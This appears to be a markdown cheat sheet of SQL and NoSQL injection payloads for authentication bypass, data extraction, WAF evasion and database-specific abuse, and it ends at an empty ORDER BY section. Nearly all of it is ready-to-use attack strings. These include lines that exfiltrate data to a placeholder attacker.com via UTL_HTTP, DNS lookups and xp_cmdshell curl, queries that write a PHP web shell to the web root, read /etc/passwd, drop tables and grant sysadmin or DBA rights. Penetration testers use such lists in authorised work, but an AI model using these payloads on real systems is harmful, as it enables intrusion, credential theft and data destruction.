# SQL Injection (SQLi) Payloads

> Complete collection of SQL injection payloads for database testing, authentication bypass, data extraction, and WAF evasion.

---

## 📋 Table of Contents
- [Authentication Bypass](#authentication-bypass)
- [Union-Based Payloads](#union-based-payloads)
- [Error-Based Payloads](#error-based-payloads)
- [Blind Boolean Payloads](#blind-boolean-payloads)
- [Time-Based Blind Payloads](#time-based-blind-payloads)
- [Stacked Queries](#stacked-queries)
- [Database Fingerprinting](#database-fingerprinting)
- [Data Extraction](#data-extraction)
- [WAF Bypass Techniques](#waf-bypass-techniques)
- [NoSQL Injection](#nosql-injection)
- [Second-Order SQLi](#second-order-sqli)
- [Out-of-Band (OOB) Payloads](#out-of-band-oob-payloads)
- [Database-Specific Payloads](#database-specific-payloads)
- [Advanced Bypasses](#advanced-bypasses)

---

## 🔐 Authentication Bypass

### Basic Bypass
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1--
' OR 1=1 --
' OR 1=1#
' OR 1=1 LIMIT 1--
'='OR'
admin' --
admin' -- -
admin' #
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin' OR 1=1#
admin' OR 1=1/*
admin') OR ('1'='1
admin') OR ('1'='1'--
admin') OR ('1'='1'/*
admin') OR (1=1--
admin'-- -
' OR 1=1 --
' OR '1'='1' --
' OR '1'='1'/*
' OR '1'='1'#
' OR '1'='1' LIMIT 1
' OR 'x'='x
' OR 'x'='x'--
' OR 'x'='x'/*
' OR 'x'='x'#
' OR 1=1 LIMIT 1
'=' 'OR'
' OR ''='
' OR 1=1 --
' OR 1=1 --
' OR 1=1/*
' OR 1=1#
' OR 1=1 LIMIT 1
' OR 1=1 OFFSET 0
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR '1'='1'#
' OR '1'='1' LIMIT 1
' OR '1'='1' OFFSET 0
" OR "1"="1
" OR "1"="1"--
" OR "1"="1"/*
" OR "1"="1"#
" OR 1=1--
" OR 1=1 --
" OR 1=1/*
" OR 1=1#
) OR '1'='1--
) OR '1'='1'--
) OR ('1'='1--
) OR (1=1--
```
### Advanced Authentication Bypass

```
' UNION SELECT 1, '2', 3 -- -
' UNION SELECT 1, 'admin', 'password' -- -
' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') --
' OR username='admin' AND password LIKE '%' --
' OR username='admin' AND password='' --
' OR 1=1 AND SLEEP(5) --
' OR (SELECT COUNT(*) FROM users) > 0 --
' OR (SELECT username FROM users LIMIT 1) = 'admin' --
' OR 1=1 INTO DUMPFILE '/var/www/html/shell.php' --
' OR 1=1 AND (SELECT * FROM users WHERE username='admin' AND password RLIKE '^[a-z]+$') --
' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password REGEXP '^[a-f0-9]{32}$') --
' UNION SELECT 1, CONCAT(username, ':', password), 3 FROM users --
' OR (SELECT IF(1=1, BENCHMARK(1000000, MD5('a')), NULL)) --
```

### Union-Based Payloads

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,2,3,4,5,6--
' UNION SELECT 1,2,3,4,5,6,7--
' UNION SELECT 1,2,3,4,5,6,7,8--
' UNION SELECT 1,2,3,4,5,6,7,8,9--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
```

### Data Extraction with Union

```
-- MySQL
' UNION SELECT @@version, user(), database()--
' UNION SELECT table_name, column_name FROM information_schema.columns--
' UNION SELECT table_name, table_schema FROM information_schema.tables--
' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables--
' UNION SELECT CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns--

-- PostgreSQL
' UNION SELECT version(), current_user, current_database()--
' UNION SELECT table_name, column_name FROM information_schema.columns--
' UNION SELECT schemaname, tablename FROM pg_tables--

-- MSSQL
' UNION SELECT @@version, user_name(), db_name()--
' UNION SELECT name, type_desc FROM sys.objects--
' UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--

-- Oracle
' UNION SELECT banner, NULL FROM v$version--
' UNION SELECT table_name, column_name FROM all_tab_columns--
' UNION SELECT owner, table_name FROM all_tables--
```

### Advanced Union Payloads

```
-- Extract all tables and columns in one query
' UNION SELECT GROUP_CONCAT(CONCAT(table_name, ':', column_name)), NULL FROM information_schema.columns--

-- Extract data from specific table
' UNION SELECT GROUP_CONCAT(CONCAT(username, ':', password)), NULL FROM users--

-- Hex encoding to bypass filters
' UNION SELECT 0x61646d696e, 0x70617373776f7264--

-- Using NULL to match column count
' UNION SELECT NULL, username, password, NULL FROM users--

-- Comment out rest of query
' UNION SELECT username, password FROM users-- -

-- Using ORDER BY to find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 6--
' ORDER BY 7--
' ORDER BY 8--
' ORDER BY 9--
' ORDER BY 10--
' ORDER BY 100--
```

## Error-Based Payloads

### MySQL Error-Based

```
-- Extract database name
' AND extractvalue(1, concat(0x7e, database()))--
' AND updatexml(1, concat(0x7e, database()), 1)--
' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Extract version
' AND extractvalue(1, concat(0x7e, version()))--
' AND updatexml(1, concat(0x7e, version()), 1)--

-- Extract user
' AND extractvalue(1, concat(0x7e, user()))--
' AND updatexml(1, concat(0x7e, user()), 1)--

-- Extract table names
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--
' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)), 1)--

-- Extract column names
' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)))--

-- Extract data
' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(username, ':', password) FROM users LIMIT 1)))--

-- JSON error-based (MySQL 5.7+)
' AND JSON_EXTRACT('[1]', CONCAT('$.', (SELECT database())))--
```

### PostgreSQL Error-Based

```
-- Cast error
' AND 1::int=cast((SELECT version()) as int)--
' AND 1=cast((SELECT current_database()) as int)--

-- XML error
' AND query_to_xml('SELECT version()', true, true, '')::text::int--

-- Division by zero
' AND 1/CAST((SELECT version()) AS int)--

-- Type conversion error
' AND (SELECT CAST(version() AS numeric))--

-- Function error
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
```

### MSSQL Error-Based

```
-- Convert error
' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, db_name())--
' AND 1=CONVERT(int, user_name())--

-- XML error
' AND 1=(SELECT x FROM (SELECT CAST((SELECT @@version) AS xml) x) a)--

-- Divide by zero
' AND 1/0--
' AND 1/@@version--

-- Procedure error
' AND 1=(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases))--

-- Batch error
' AND RAISERROR('Error message', 16, 1)--
```

### Oracle Error-Based

```
-- Type conversion
' AND 1=CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--

-- XML error
' AND 1=(SELECT XMLTYPE('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "'||(SELECT banner FROM v$version WHERE rownum=1)||'">%remote;]>') FROM dual)--

-- Function error
' AND 1=DBMS_UTILITY.sqlid_to_sqlhash((SELECT banner FROM v$version WHERE rownum=1))--
```

## Blind Boolean Payloads

### Basic Boolean Tests

```
' AND 1=1--
' AND 1=2--
' AND '1'='1--
' AND '1'='2--
' OR 1=1--
' OR 1=2--
' AND TRUE--
' AND FALSE--
' AND 1=1-- -
' AND 1=2-- -
' OR 1=1-- -
' OR 1=2-- -
' AND 'a'='a--
' AND 'a'='b--
' AND (SELECT 1)=1--
' AND (SELECT 1)=2--
```

### Boolean Data Extraction

```
-- Check database name length
' AND (SELECT LENGTH(database())) > 1--
' AND (SELECT LENGTH(database())) > 5--
' AND (SELECT LENGTH(database())) = 8--

-- Extract database name character by character
' AND ASCII(SUBSTRING(database(),1,1)) > 64--
' AND ASCII(SUBSTRING(database(),1,1)) = 109--
' AND (SELECT SUBSTRING(database(),1,1)) = 'm'--

-- Check table existence
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT COUNT(*) FROM users) = 1--
' AND EXISTS(SELECT * FROM users)--

-- Extract table names
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 64--

-- Extract column names
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1)) > 64--

-- Extract data
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 64--

-- Conditional extraction
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1--
' AND (SELECT IF(1=1, 1, 0)) = 1-- (MySQL)
' AND (SELECT IIF(1=1, 1, 0)) = 1-- (MSSQL)
```

### Advanced Boolean Blind

```
-- Bit-by-bit extraction (efficient)
' AND (SELECT (SELECT version()) & 1) = 1--

-- Using REGEXP/RLIKE
' AND (SELECT database() RLIKE '^[a-z]')--
' AND (SELECT database() REGEXP '^sec')--

-- Using LIKE
' AND (SELECT database() LIKE 's%')--
' AND (SELECT database() LIKE 'se%')--

-- Using BETWEEN
' AND (SELECT database() BETWEEN 'a' AND 'z')--

-- Using IN
' AND (SELECT database() IN ('mysql', 'test', 'security'))--

-- Using STRCMP (MySQL)
' AND STRCMP(database(), 'security') = 0--

-- Using POSITION
' AND POSITION('sec' IN database()) = 1--
```

## Time-Based Blind Payloads

### MySQL Time-Based

```
-- Basic sleep
' AND SLEEP(5)--
' OR SLEEP(5)--
' AND BENCHMARK(10000000, MD5('a'))--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--

-- Conditional sleep
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=109, SLEEP(5), 0)--

-- Heavy query sleep
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--

-- Stored procedure sleep
' AND (SELECT @a:=SLEEP(5))--

-- JSON sleep (MySQL 5.7+)
' AND JSON_VALID('{"a":1}', SLEEP(5))--

-- RLIKE sleep
' AND (SELECT RLIKE('a', REPEAT('a', 10000000)))--
```

### PostgreSQL Time-Based

```
-- Basic pg_sleep
' AND pg_sleep(5)--
' OR pg_sleep(5)--
' AND (SELECT pg_sleep(5))--

-- Conditional sleep
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Heavy query sleep
' AND (SELECT COUNT(*) FROM generate_series(1,10000000))--

-- Function sleep
' AND (SELECT set_config('statement_timeout', '5s', true))--

-- Gen_random_uuid heavy
' AND (SELECT COUNT(*) FROM generate_series(1,10000000), gen_random_uuid())--
```

### MSSQL Time-Based

```
-- Basic waitfor
' WAITFOR DELAY '0:0:5'--
' AND WAITFOR DELAY '0:0:5'--
' OR WAITFOR DELAY '0:0:5'--
' ; WAITFOR DELAY '0:0:5'--

-- Conditional waitfor
' AND IF(1=1, WAITFOR DELAY '0:0:5', 0)--
' AND (SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE NULL END)--

-- Heavy query (benchmark alternative)
' AND (SELECT COUNT(*) FROM sys.objects A, sys.objects B, sys.objects C)--

-- Procedure sleep
' AND EXEC master.dbo.xp_cmdshell 'ping -n 5 127.0.0.1'--

-- LIKE heavy operation
' AND (SELECT TOP 1 * FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS N FROM sys.objects A, sys.objects B) T WHERE N=1000000)--
```

### Oracle Time-Based

```
-- Basic dbms_lock.sleep
' AND dbms_lock.sleep(5)--
' OR dbms_lock.sleep(5)--

-- Conditional sleep
' AND CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE null END--

-- Heavy query sleep
' AND (SELECT COUNT(*) FROM all_objects WHERE ROWNUM < 1000000)--

-- UTL_INADDR sleep (network delay)
' AND utl_inaddr.get_host_address('google.com')--

-- CTXSYS sleep
' AND ctxsys.drithsx.sn(1, 'sleep')--
```

## Stacked Queries

### Basic Stacked Queries

```
-- MySQL
'; DROP TABLE users; --
'; INSERT INTO admin VALUES('hacker','pass')--
'; UPDATE users SET password='newpass' WHERE username='admin'--
'; DELETE FROM logs WHERE id=1--
'; CREATE TABLE backdoor(id INT, cmd VARCHAR(100))--

-- PostgreSQL
'; DROP TABLE users; --
'; INSERT INTO users VALUES('hacker', 'pass')--
'; SELECT pg_sleep(10); --

-- MSSQL
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_addlogin 'hacker', 'pass'--
'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--

-- Oracle
'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END; --
```
### Advanced Stacked Queries

```
-- Multiple statements
'; DROP TABLE users; SELECT * FROM admins; --

-- Conditional stacked queries
'; IF (1=1) BEGIN DROP TABLE users; END; --

-- File operations (MySQL)
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

'; LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/out.txt'--

'; SELECT @@datadir INTO OUTFILE '/tmp/path.txt'--

-- System commands (MSSQL)
'; EXEC master..xp_cmdshell 'ipconfig'--

'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName'--

'; EXEC xp_fileexist 'C:\Windows\win.ini'--

-- Database links (Oracle)
'; CREATE DATABASE LINK hacker CONNECT TO user IDENTIFIED BY pass USING 'remote'--

'; SELECT * FROM users@hacker--
```

## Database Fingerprinting

### Version Detection

```
-- Generic
' AND @@version LIKE '%MySQL%'--
' AND @@version LIKE '%PostgreSQL%'--
' AND @@version LIKE '%Microsoft%'--
' AND @@version LIKE '%Oracle%'--

-- MySQL specific
' AND @@version_comment LIKE '%MySQL%'--
' AND @@version_compile_os LIKE '%Linux%'--
' AND @@have_openssl = 1--

-- PostgreSQL specific
' AND current_setting('server_version') LIKE '%PostgreSQL%'--

-- MSSQL specific
' AND @@version LIKE '%SQL Server%'--
' AND SERVERPROPERTY('productversion') LIKE '%SQL%'--

-- Oracle specific
' AND banner FROM v$version LIKE '%Oracle%'--
```

### Database Detection Payloads

```
-- Check for MySQL
' AND SLEEP(5) AND '1'='1  (works only in MySQL)

-- Check for PostgreSQL
' AND pg_sleep(5) AND '1'='1  (works only in PostgreSQL)

-- Check for MSSQL
' AND WAITFOR DELAY '0:0:5' AND '1'='1  (works only in MSSQL)

-- Check for Oracle
' AND dbms_lock.sleep(5) AND '1'='1  (works only in Oracle)

-- Version-specific functions
' AND CONNECTION_ID() > 0--  (MySQL)
' AND pg_backend_pid() > 0--  (PostgreSQL)
' AND @@spid > 0--  (MSSQL)
```

## Data Extraction Payloads

### Extract All Tables

```
-- MySQL
' UNION SELECT GROUP_CONCAT(DISTINCT table_name), NULL FROM information_schema.tables--

-- PostgreSQL
' UNION SELECT string_agg(table_name, ','), NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT STRING_AGG(table_name, ','), NULL FROM information_schema.tables--

-- Oracle
' UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name), NULL FROM all_tables--
```
### Extract All Columns

```
-- MySQL
' UNION SELECT GROUP_CONCAT(CONCAT(table_name, '.', column_name)), NULL FROM information_schema.columns--

-- PostgreSQL
' UNION SELECT string_agg(CONCAT(table_name, '.', column_name), ','), NULL FROM information_schema.columns--

-- MSSQL
' UNION SELECT STRING_AGG(CONCAT(table_name, '.', column_name), ','), NULL FROM information_schema.columns--

-- Oracle
' UNION SELECT LISTAGG(table_name || '.' || column_name, ',') WITHIN GROUP (ORDER BY table_name), NULL FROM all_tab_columns--
```

### Extract Data from Tables

```
-- MySQL
' UNION SELECT GROUP_CONCAT(CONCAT(username, ':', password)), NULL FROM users--
' UNION SELECT GROUP_CONCAT(CONCAT_WS(':', id, username, password, email)), NULL FROM users--

-- PostgreSQL
' UNION SELECT string_agg(CONCAT(username, ':', password), ','), NULL FROM users--

-- MSSQL
' UNION SELECT STRING_AGG(CONCAT(username, ':', password), ','), NULL FROM users--

-- Oracle
' UNION SELECT LISTAGG(username || ':' || password, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--

-- Extract with row limits
' UNION SELECT CONCAT(username, ':', password) FROM users LIMIT 0,1--
' UNION SELECT CONCAT(username, ':', password) FROM users LIMIT 1,1--
' UNION SELECT CONCAT(username, ':', password) FROM users LIMIT 2,1--
```

### Extract Database Names

```
-- MySQL
' UNION SELECT GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata--

-- PostgreSQL
' UNION SELECT string_agg(datname, ','), NULL FROM pg_database--

-- MSSQL
' UNION SELECT STRING_AGG(name, ','), NULL FROM sys.databases--

-- Oracle
' UNION SELECT LISTAGG(username, ','), NULL FROM all_users--
```

##  WAF Bypass Techniques

### Comment-Based Bypasses

```
/**/OR/**/1=1--
/*!OR*/ 1=1--
/*!50000OR*/ 1=1--
' OR 1=1-- -
' OR 1=1# 
' OR 1=1/*
' OR 1=1 AND '1'='1
'%2bOR%2b1%3d1--
' || 1=1--
' || 1=1-- -
' || 1=1#
' || 1=1/*
'%20OR%201=1%20--
'%20OR%201=1%23
'%20||%201=1%20--
'%20||%201=1%23
```

### Encoding Bypasses

```
-- URL Encoding
%27%20OR%201%3D1%20--
%27%20OR%201%3D1%23
%27%20%7C%7C%201%3D1%20--

-- Double URL Encoding
%2527%2520OR%25201%253D1%2520--

-- Unicode Encoding
%ef%bc%87 OR 1=1-- 
%ef%bc%87%ef%bc%87%ef%bc%87

-- Hex Encoding
0x27204f5220313d312d2d
0x61646d696e27

-- Base64 Encoding (if decoded by app)
JyBPUiAxPTEtLQ==

-- HTML Entities
' OR 1=1--
&#39; OR 1=1--
&#x27; OR 1=1--
&apos; OR 1=1--
```

### Case Variation Bypasses

```
' Or 1=1--
' oR 1=1--
' OR 1=1--
' Or 1=1--
' oR 1=1--
' OR 1=1--
' oR 1=1--
' Or 1=1--
' O r 1=1--
' O R 1=1--
' o r 1=1--
```

### Keyword Filter Bypasses

```
-- Using AND/OR alternatives
' && 1=1--
' || 1=1--
' ^ 1=1--
' & 1=1--
' | 1=1--

-- Using mathematical operators
' + 1=1--
' - -1=1--
' * 1=1--
' / 1=1--

-- Using comparison operators
' <> 0--
' > 0--
' < 1--

-- Using logical operators
' XOR 1=1--
' NOT 1=0--

-- Using function alternatives
' AND IFNULL(NULL, 1)=1--
' AND COALESCE(NULL, 1)=1--
' AND ISNULL(1)=0--
```

### Advanced WAF Bypasses

```
-- Using line breaks
'
OR
1=1--

-- Using tabs
'	OR	1=1--

-- Using null bytes
'%00OR%001=1--

-- Using parentheses
' OR (1=1)--
' OR ((1=1))--

-- Using backticks (MySQL)
`'` OR 1=1--

-- Using double quotes
" OR 1=1--

-- Using backslash escaping
\' OR 1=1--

-- Using CONCAT
' OR CONCAT(1,1)=11--

-- Using CHAR()
' OR CHAR(49)=1--

-- Using HEX()
' OR HEX(1)=HEX(1)--

-- Using BIN()
' OR BIN(1)=BIN(1)--

-- Using CASE
' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--

-- Using IF()
' OR IF(1=1,1,0)=1--

-- Using BETWEEN
' OR 1 BETWEEN 1 AND 2--

-- Using IN
' OR 1 IN (1,2,3)--

-- Using LIKE
' OR 1 LIKE 1--

-- Using REGEXP
' OR 1 REGEXP '^1$'--

-- Using SOUNDS LIKE (MySQL)
' OR 1 SOUNDS LIKE 1--

-- Using DIV (MySQL)
' OR 1 DIV 1=1--

-- Using MOD (MySQL)
' OR 1 MOD 1=0--

-- Using RLIKE (MySQL)
' OR 1 RLIKE 1--
```

### SQLi in JSON/XML

```
// JSON SQLi
{"username": "' OR '1'='1", "password": "anything"}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

```
<!-- XML SQLi -->
<user>
  <username>' OR '1'='1</username>
  <password>anything</password>
</user>

<!-- XPATH Injection -->
<user>' or '1'='1</user>
<user>' or ''='</user>
```

## NoSQL Injection

### MongoDB Payloads

```
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}

// Data extraction
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$in": ["admin", "root", "user"]}}

// Boolean-based
{"username": "admin", "password": {"$ne": "wrong"}}
{"$and": [{"username": "admin"}, {"password": {"$ne": null}}]}

// Time-based (if JS execution enabled)
{"$where": "sleep(5000) && 1==1"}
{"$where": "function() { sleep(5000); return true; }"}
{"$where": "this.username == 'admin' && sleep(5000)"}

// JavaScript injection
{"$where": "this.password.length > 0"}
{"$where": "this.username.match(/^admin$/)"}
{"$where": "function() { return this.username == 'admin' }"}
```

### MongoDB Advanced

```
// Operator injection
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}

// Regex injection
{"username": {"$regex": "^admin$", "$options": "i"}}

// Comment injection
{"username": "admin", "$comment": "malicious query"}

// Where clause injection
{"$where": "Object.keys(this)[0].match('^a')"}

// Function injection
{"$where": "function() { var a=this.username; return a=='admin'; }"}
```

## Second-Order SQLi

### Registration Phase (Store payload)

```
-- Register with payload in username
username: admin' OR '1'='1
username: admin'--
username: admin'/*
username: admin' AND 1=1--

-- Store in other fields
email: test@example.com' OR '1'='1
fullname: John' OR 1=1--
bio: ' UNION SELECT @@version--
```

### Login Phase (Trigger payload)

```
-- After stored payload is used in another query
-- Example: Admin panel showing user list
SELECT * FROM users WHERE username = 'admin' OR '1'='1'

-- Example: Profile update triggering stored payload
UPDATE users SET email = 'new@email.com' WHERE username = 'admin' OR '1'='1'

-- Example: Search functionality
SELECT * FROM posts WHERE author = 'admin' OR '1'='1'
```

## Out-of-Band (OOB) Payloads

### DNS Exfiltration

```
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\test'))--
' AND (SELECT @@version INTO OUTFILE '\\\\attacker.com\\share\\out.txt')--

-- PostgreSQL
' AND copy((SELECT version()) to '/tmp/test')--
' AND (SELECT pg_xlog_replay_pause('\\'||(SELECT version())||'.attacker.com'))--

-- MSSQL
' AND master..xp_dirtree '\\attacker.com\share'--
' AND (SELECT * FROM OPENROWSET('SQLOLEDB', 'server=attacker.com;uid=sa;pwd=', 'SELECT 1'))--

-- Oracle
' AND UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com')--
' AND UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))--
```

### HTTP Exfiltration

```
-- MySQL
' AND (SELECT * FROM (SELECT(1))a INTO DUMPFILE '\\\\attacker.com\\file')--
' AND (SELECT version()) INTO OUTFILE '/tmp/test'--

-- PostgreSQL
' AND (SELECT version())::text >> '//attacker.com/file'--

-- MSSQL
' AND EXEC master..xp_cmdshell 'curl http://attacker.com/?data='$(whoami)''--

-- Oracle
' AND UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))--
```

## Database-Specific Advanced Payloads

### MySQL Advanced

```
-- File read
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--
' AND (SELECT LOAD_FILE('/etc/passwd'))--

-- File write
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell2.php'--

-- System commands (via UDF)
' AND (SELECT sys_exec('id'))--
' AND (SELECT sys_eval('whoami'))--

-- Information schema access
' UNION SELECT * FROM information_schema.PROCESSLIST--
' UNION SELECT * FROM information_schema.GLOBAL_VARIABLES--

-- User-defined variables
' AND @a:=SLEEP(5)--
' AND @a:=BENCHMARK(1000000,MD5('a'))--

-- JSON functions (MySQL 5.7+)
' AND JSON_EXTRACT('[1,2,3]', CONCAT('$[', (SELECT database()), ']'))--
' AND JSON_SEARCH('{"a":1}', 'all', (SELECT database()))--

-- Regular expressions
' AND (SELECT database()) RLIKE '^[a-z]+$'--
' AND (SELECT version()) REGEXP '^5\.'--

-- Hashing functions
' AND MD5((SELECT database())) = 'xxx'--
' AND SHA1((SELECT database())) = 'xxx'--
```

### PostgreSQL Advanced

```
-- File read
' UNION SELECT pg_read_file('/etc/passwd')--
' UNION SELECT pg_read_file('postgresql.conf', 0, 1000)--

-- File write
' UNION SELECT pg_write_file('/tmp/test.txt', 'content', false)--

-- System commands
' AND (SELECT * FROM pg_extension WHERE extname='dblink')--
' AND (SELECT dblink_connect('host=attacker.com user=postgres password=pass'))--

-- Large object operations
' UNION SELECT lo_import('/etc/passwd')--
' UNION SELECT lo_get(16400)--

-- Database links
' AND (SELECT dblink_connect('dbname=target'))--
' AND (SELECT dblink_exec('SELECT * FROM users'))--

-- XML functions
' AND query_to_xml('SELECT version()', true, true, '')::text LIKE '%PostgreSQL%'--

-- Array functions
' AND (SELECT array_to_string(ARRAY(SELECT username FROM users), ',')) LIKE '%admin%'--

-- String aggregation
' AND (SELECT string_agg(table_name, ',') FROM information_schema.tables) LIKE '%users%'--
```

### MSSQL Advanced

```
-- System commands
' AND master..xp_cmdshell 'whoami'--
' AND master..xp_cmdshell 'ipconfig /all'--
' AND master..xp_cmdshell 'net user'--

-- Registry access
' AND master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
' AND master..xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Test', 'Value', 'REG_SZ', 'data'--
' AND master..xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Test'--

-- File operations
' AND master..xp_fileexist 'C:\Windows\win.ini'--
' AND master..xp_subdirs 'C:\'--
' AND master..xp_dirtree 'C:\'--

-- Service control
' AND master..xp_servicecontrol 'start', 'MSSQLSERVER'--

-- Open rowset
' AND (SELECT * FROM OPENROWSET('SQLOLEDB', 'server=attacker.com;uid=sa;pwd=', 'SELECT 1'))--

-- Bulk insert
' AND (SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS contents)--

-- Database mail
' AND master..xp_sendmail 'attacker@example.com', 'Data: ' + (SELECT @@version)--

-- SQL Agent jobs
' AND msdb..sp_add_job @job_name='test'--
' AND msdb..sp_add_jobstep @job_name='test', @step_name='step1', @command='whoami'--
' AND msdb..sp_start_job @job_name='test'--
```

### Oracle Advanced

```
-- File operations
' AND UTL_FILE.fopen('/etc/passwd', 'r')--
' AND UTL_FILE.fclose(handle)--

-- HTTP requests
' AND UTL_HTTP.request('http://attacker.com/?data='||(SELECT banner FROM v$version WHERE rownum=1))--
' AND UTL_HTTP.begin_request('http://attacker.com')--

-- DNS requests
' AND UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com')--

-- XML parsing
' AND XMLTYPE('<?xml version="1.0"?><root><data>'||(SELECT banner FROM v$version WHERE rownum=1)||'</data></root>')--

-- Java procedures
' AND (SELECT dbms_java.runjava('Runtime.getRuntime().exec("id")'))--

-- Database links
' AND (SELECT * FROM dual@attacker)--

-- Privilege escalation
' AND GRANT DBA TO PUBLIC--

-- Password cracking
' AND (SELECT password FROM dba_users WHERE username='SYS')--
```

##  Injection in Different Contexts

### Numeric Injection (No quotes)

```
-- Original: SELECT * FROM users WHERE id = 1
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 UNION SELECT 1,2,3
1 AND SLEEP(5)
1 AND (SELECT COUNT(*) FROM users) > 0
```

### String Injection (Single quotes)

```
-- Original: SELECT * FROM users WHERE username = 'admin'
' OR '1'='1
' UNION SELECT 1,2,3--
' AND SLEEP(5)--
' AND (SELECT COUNT(*) FROM users) > 0--
```

### Double Quotes Injection

```
-- Original: SELECT * FROM users WHERE username = "admin"
" OR "1"="1
" UNION SELECT 1,2,3--
" AND SLEEP(5)--
" AND (SELECT COUNT(*) FROM users) > 0--
```

### LIKE/Wildcard Injection

```
-- Original: SELECT * FROM products WHERE name LIKE '%search%'
%' OR '1'='1'%
%' AND 1=2--
%' UNION SELECT 1,2,3--
%' AND SLEEP(5)--
```

### IN Clause Injection

```
-- Original: SELECT * FROM users WHERE id IN (1,2,3)
1,2,3) OR 1=1--
1,2,3) UNION SELECT 1,2,3--
1,2,3) AND SLEEP(5)--
```

### ORDER BY Injection

```
